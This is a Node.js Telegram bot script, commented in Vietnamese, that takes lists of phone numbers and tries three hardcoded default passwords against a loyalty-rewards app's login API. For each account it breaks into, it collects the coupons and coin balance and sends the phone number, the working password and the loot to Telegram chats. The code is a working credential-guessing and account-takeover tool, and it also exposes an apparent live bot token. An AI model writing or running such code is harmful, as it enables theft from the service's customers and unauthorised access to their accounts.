const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const keep_alive = require('./keep_alive.js');

const token = '7449609039:AAFLCwOX57frCqDP2-2C3ohced3vFqSMBOc';
const bot = new TelegramBot(token, {polling: true});
let dataPhone = [];

let chatIds = [];

async function sendTelegramMessage(message) {
    for (const id of chatIds) {
        try {
            await bot.sendMessage(id, message);
        } catch (error) {
            console.error(`Lỗi gửi tin nhắn đến Telegram (chatId: ${id}):`, error);
        }
    }
}

async function syncProfile(phoneNumber) {
    const response = await axios.post('https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/customers/sync-profile-from-clm', {"phoneNumber": phoneNumber}, {
        headers: {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "content-length": '28',
            "host": "backend2.tgss.vn"
        }
    });
    return response.data

}

async function loginAcc(userName, reties = 3) {
    let password = "";
    if (reties < 0) {
        return;
    }
    if (reties === 3) {
        password = "111111";
    }
    if (reties === 2) {
        password = "666777";
    }
    if (reties === 1) {
        password = "777333";
    }

    const data = {
        userName: userName,
        password: password
    };
    try {
        const response = await axios.post('https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/customers/login', data, {
            headers: {
                "user-agent": "Dart/2.18 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "content-length": '45',
                "host": "backend2.tgss.vn"
            }
        });
        const status = response.data.success;
        if (status) {
            const token = response.data.data.token;
            return {
                token: token,
                password: password
            };
        }
        return await loginAcc(userName, reties - 1);
    } catch (error) {
        const message= `${userName}:Sai mật khẩu mặc định`;
        console.error(message)
        await sendTelegramMessage(message);
    }

}

async function getCoupon(token) {
    const response = await axios.get("https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/posts/exchanges?Status=1&PageIndex=1&PageSize=10000", {
        headers: {
            "User-Agent": "Dart/2.18 (dart:io)",
            "Accept-Encoding": "gzip",
            "host": "backend2.tgss.vn",
            "Authorization": `Bearer ${token}`,
        }
    })
    return response.data.data
}

async function checkPoint(token) {
    const url = "https://backend2.tgss.vn/0e96d6b13fb5335193eee7ed50eb5aa0/memberships";
    const headers = {
        "user-agent": 'Dart/2.18 (dart:io)',
        "clientid": "680dc919-1e70-4f96-9896-1e74f911b5b7",
        "accept-encoding": "gzip",
        "Authorization": `Bearer ${token}`,
        'host': 'backend2.tgss.vn'
    }

    const response = axios.get(url, {headers: headers});
    return (await response).data.data.memberLevels[0].gCoinOfCurrentLevel
}

async function exportGift() {
    const usedPhones = [];
    const unusedPhones = [];
    let usedCouponCount = 0;
    let hasGiftPostCount = 0;
    for (const item of dataPhone) {
        const userName = `0${item}`;
        console.log(userName)
        await syncProfile(userName);
        const loginResult = await loginAcc(userName);
        if (loginResult && loginResult.token) {
            const {token, password} = loginResult;
            const result = await getCoupon(token);
            const gCoin = await checkPoint(token);
            if (result) {
                const postCoupon = result.items;
                let title = '';
                for (const coupons of postCoupon) {
                    for (const coupon of coupons) {
                        if (coupon.post) {
                            title += `:` + coupon.post.title
                        } else {
                            title += `:` + coupon.referral.title
                        }
                    }
                }
                const dataCoupon = `${userName} ${password} gCoin:${gCoin} ${title}`;
                console.log(`${dataCoupon}`);
                usedPhones.push(item);
                hasGiftPostCount++;
                await sendTelegramMessage(dataCoupon);
            } else {
                unusedPhones.push(item);
                const message = `${item}: Không còn coupon`;
                usedCouponCount++;
                await sendTelegramMessage(message);
                console.log(message)
            }
        }
    }
    const summaryMessage = `Tổng tài khoản rỗng coupon : ${usedCouponCount} : ${unusedPhones.join(', ')}\n` +
        `Tổng tài khoản còn coupon ': ${hasGiftPostCount} : ${usedPhones.join(', ')}`
    await sendTelegramMessage(summaryMessage);
    dataPhone = [];
}


bot.on('message', async (msg) => {
    const messageChatId = msg.chat.id;
    const text = msg.text;

    console.log(messageChatId);
    if (!chatIds.includes(messageChatId)) {
        chatIds.push(messageChatId);
    }
    if (text) {
        const phones = text.split('\n').map(phone => phone.trim());
        const invalidPhones = [];

        phones.forEach(phone => {
            const phoneMatch = phone.match(/^0?(\d{9})/);
            if (phoneMatch) {
                // Extract phone number without the leading zero
                const phoneNumber = phoneMatch[1];
                if (!dataPhone.includes(phoneNumber)) {
                    dataPhone.push(phoneNumber);
                }
            } else {
                invalidPhones.push(phone);
            }
        });
        console.log(dataPhone);
        console.log(invalidPhones);
        let responseMessage = `Danh sách số điện thoại nhập vào:\n${dataPhone.join('\n')}`;
        if (invalidPhones.length > 0) {
            responseMessage += `\nSố điện thoại không hợp lệ: ${invalidPhones.join(', ')}`;
        }
        await sendTelegramMessage(responseMessage);
        try {
            await exportGift();
        } catch (error) {
            console.error("Lỗi khi chạy exportGift:", error);
        }
    } else {
        await sendTelegramMessage('Lệnh không hợp lệ');
    }
});
